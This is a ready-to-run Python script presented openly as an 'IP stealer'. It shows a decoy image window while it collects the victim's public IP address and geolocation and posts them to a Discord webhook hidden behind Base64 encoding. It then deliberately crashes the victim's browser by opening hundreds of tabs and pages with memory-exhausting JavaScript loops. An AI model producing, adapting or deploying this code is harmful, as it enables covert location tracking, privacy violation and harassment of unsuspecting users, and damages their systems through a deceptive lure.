# ==================== REQUIREMENTS ====================
# Run this command first:
# pip install requests

# ==================== BUILT-IN CONFIG ====================
# EDIT THIS LINE - Supports normal URL or Base64 encoded URL
# Example normal: https://discord.com/api/webhooks/1234567890/abc...
# Example Base64: aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNDU2Nzg5MC9hYmM...
WEBHOOK_URL = 'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQ4ODI1OTAxMzk5NjA1NjYxOS9ZU1BHNFZ0Mmk2VlBDYlc0elU0YnpyLU1BMGlZNlNtMjZpU21sQW1mR1RtREpqcWhyNXJhRnlkZVpoTFhfU25fRzNyQQ=='

import requests
import time
import webbrowser
import tkinter as tk
from tkinter import messagebox
import os
import subprocess
import platform
import base64

def decode_webhook_url(url):
    """Auto-detect and decode Base64 if needed."""
    if url.startswith('https://'):
        return url
    try:
        decoded = base64.b64decode(url).decode('utf-8')
        if decoded.startswith('https://discord.com/api/webhooks/'):
            print("✅ Base64 webhook decoded successfully.")
            return decoded
        else:
            return url
    except:
        return url  # fallback to raw

# Decode at startup
WEBHOOK_URL = decode_webhook_url(WEBHOOK_URL)

FAKE_IMAGE_URL = 'https://picsum.photos/800/600'

def get_ip_and_coords():
    try:
        ip_response = requests.get("https://api.ipify.org?format=json", timeout=10)
        ip = ip_response.json().get("ip", "Unknown")

        geo_response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=10)
        geo = geo_response.json()

        return {
            "ip": ip,
            "latitude": geo.get("latitude", "Unknown"),
            "longitude": geo.get("longitude", "Unknown"),
            "city": geo.get("city", "Unknown"),
            "country": geo.get("country_name", "Unknown"),
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC")
        }
    except:
        return {"ip": "Failed to fetch", "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC")}

def send_to_webhook(data):
    payload = {
        "content": "🔴 **IP + Coordinates Stolen + Browser Crashed**",
        "embeds": [{
            "title": "Full Steal Report",
            "color": 16711680,
            "fields": [
                {"name": "IP Address", "value": data.get("ip"), "inline": True},
                {"name": "Latitude", "value": str(data.get("latitude")), "inline": True},
                {"name": "Longitude", "value": str(data.get("longitude")), "inline": True},
                {"name": "City / Country", "value": f"{data.get('city')} - {data.get('country')}", "inline": False},
                {"name": "Timestamp", "value": data.get("timestamp"), "inline": False},
                {"name": "Status", "value": "Browser crash initiated", "inline": False}
            ]
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print("✅ Data sent to webhook.")
    except Exception as e:
        print(f"⚠️ Webhook send failed: {e}")

def crash_browser():
    print("💥 Initiating aggressive browser crash...")
    for i in range(200):
        try:
            webbrowser.open("https://www.youtube.com/watch?v=dQw4w9wgxcq&autoplay=1")
            time.sleep(0.02)
        except:
            pass
    try:
        for _ in range(70):
            webbrowser.open("data:text/html,<script>let x=[];while(true){x.push(new Array(1000000))}</script>")
    except:
        pass
    print("Browser crash sequence completed.")

def show_fake_image():
    root = tk.Tk()
    root.title("Beautiful Image")
    root.geometry("850x650")
    webbrowser.open(FAKE_IMAGE_URL)
    messagebox.showinfo("Image", "Enjoy this nice fake image!\n\nBackground tasks running...")
    root.after(2500, root.destroy)
    root.mainloop()

def main():
    print("Starting silent IP stealer with fake image + browser crash + Base64 webhook support...")
    show_fake_image()
    
    data = get_ip_and_coords()
    send_to_webhook(data)
    crash_browser()
    
    print("\n=== Operation Complete ===")
    print("IP + Coordinates stolen, sent to webhook, browser crashed.")
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
